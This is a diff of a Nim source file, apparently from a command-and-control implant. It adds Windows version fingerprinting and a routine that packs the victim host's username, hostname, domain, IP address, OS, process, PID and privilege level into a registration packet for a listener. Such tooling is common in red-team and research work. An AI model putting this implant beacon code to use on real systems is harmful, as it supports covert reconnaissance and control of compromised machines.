@@ -1,6 +1,7 @@
 import winim, os, net, strformat, strutils, registry
 
-import ./[agentTypes, utils]
+import ../agentTypes
+import ../../../common/[types, utils]
 
 # Hostname/Computername
 proc getHostname*(): string = 
@@ -68,6 +69,69 @@ proc getIPv4Address*(): string =
     return $getPrimaryIpAddr()
 
 # Windows Version fingerprinting
+proc getWindowsVersion*(info: agentTypes.OSVersionInfoExW, productType: ProductType): string =
+    let
+        major = info.dwMajorVersion
+        minor = info.dwMinorVersion
+        build = info.dwBuildNumber
+        spMajor = info.wServicePackMajor
+    
+    if major == 10 and minor == 0:
+        if productType == WORKSTATION:
+            if build >= 22000:
+                return "Windows 11"
+            else:
+                return "Windows 10"
+
+        else:
+            case build:
+                of 20348:
+                    return "Windows Server 2022"
+                of 17763:
+                    return "Windows Server 2019"
+                of 14393:
+                    return "Windows Server 2016"
+                else:
+                    return fmt"Windows Server 10.x (Build: {build})"
+
+    elif major == 6:
+        case minor:
+        of 3:
+            if productType == WORKSTATION:
+                return "Windows 8.1"
+            else:
+                return "Windows Server 2012 R2"
+        of 2:
+            if productType == WORKSTATION:
+                return "Windows 8"
+            else:
+                return "Windows Server 2012"
+        of 1:
+            if productType == WORKSTATION:
+                return "Windows 7"
+            else:
+                return "Windows Server 2008 R2"
+        of 0:
+            if productType == WORKSTATION:
+                return "Windows Vista"
+            else:
+                return "Windows Server 2008"
+        else: 
+            discard
+
+    elif major == 5:
+        if minor == 2:
+            if productType == WORKSTATION:
+                return "Windows XP x64 Edition"
+            else:
+                return "Windows Server 2003"
+        elif minor == 1:
+            return "Windows XP"
+    else: 
+        discard 
+
+    return "Unknown Windows Version"
+
 proc getProductType(): ProductType =
     # The product key is retrieved from the registry
     # HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
@@ -108,4 +172,29 @@ proc getOSVersion*(): string =
     else:
         return "Unknown"
 
+proc getRegistrationData*(config: AgentConfig): AgentRegistrationData = 
     
+    return AgentRegistrationData(
+        header: Header(
+            magic: MAGIC,
+            version: VERSION, 
+            packetType: cast[uint8](MSG_RESPONSE),
+            flags: cast[uint16](FLAG_PLAINTEXT),
+            seqNr: 1'u32, # TODO: Implement sequence tracking
+            size: 0'u32,
+            hmac: default(array[16, byte])
+        ), 
+        metadata: AgentMetadata(
+            agentId: uuidToUint32(config.agentId),
+            listenerId: uuidToUint32(config.listenerId),
+            username: getUsername().toBytes(),
+            hostname: getHostname().toBytes(),
+            domain: getDomain().toBytes(),
+            ip: getIPv4Address().toBytes(),
+            os: getOSVersion().toBytes(),
+            process: getProcessExe().toBytes(),
+            pid: cast[uint32](getProcessId()),
+            isElevated: cast[uint8](isElevated()),
+            sleep: cast[uint32](config.sleep)
+        )
+    )
